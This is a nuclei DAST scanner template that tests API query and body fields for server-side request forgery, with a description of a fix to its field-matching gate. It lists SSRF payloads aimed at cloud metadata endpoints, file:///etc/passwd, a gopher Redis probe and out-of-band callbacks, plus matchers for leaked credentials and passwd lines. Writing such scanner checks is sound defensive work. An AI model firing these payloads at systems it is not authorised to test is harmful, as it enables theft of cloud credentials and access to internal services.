id: api7-ssrf-url-param
info:
  name: API7 Server Side Request Forgery - URL-Shaped Value Injection (value-shape aware)
  author: dast-scanner
  severity: critical
  description: 'Targets fields by VALUE SHAPE, not name. FIXED: nuclei''s openapi mode does not specialize placeholders by ''format'' (uri/url), only by ''type'' -- so a string field with format:uri gets the generic literal "string" as its placeholder, which the old gate (^scheme://) rejected outright. That silently killed every SSRF finding on schema-declared URL fields (confirmed: 308 requests sent, 0 matches, real sink at POST /profile/image/url never tested). Gate now also matches nuclei''s own generic string placeholder and empty values, in addition to anything already URL-shaped from real captured traffic.'
  classification:
    cwe-id: CWE-918
  tags: api,owasp-api7,ssrf,dast
http:
- fuzzing:
  - part: query
    type: replace
    mode: single
    keys-regex:
    - .*
    values:
    - ^[a-zA-Z][a-zA-Z0-9+.-]*://|^string$|^$
    fuzz:
    - http://{{interactsh-url}}
    - https://{{interactsh-url}}
    - http://169.254.169.254/latest/meta-data/
    - http://metadata.google.internal/computeMetadata/v1/
    - http://127.0.0.1
    - file:///etc/passwd
    - gopher://127.0.0.1:6379/_
  - part: body
    type: replace
    mode: single
    keys-regex:
    - .*
    values:
    - ^[a-zA-Z][a-zA-Z0-9+.-]*://|^string$|^$
    fuzz:
    - http://{{interactsh-url}}
    - https://{{interactsh-url}}
    - http://169.254.169.254/latest/meta-data/
    - http://metadata.google.internal/computeMetadata/v1/
    - http://127.0.0.1
    - file:///etc/passwd
    - gopher://127.0.0.1:6379/_
  matchers-condition: or
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
    - https
    - dns
    condition: or
  - type: word
    part: body
    words:
    - ami-id
    - instance-id
    - computeMetadata
    - iam/security-credentials
    condition: or
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
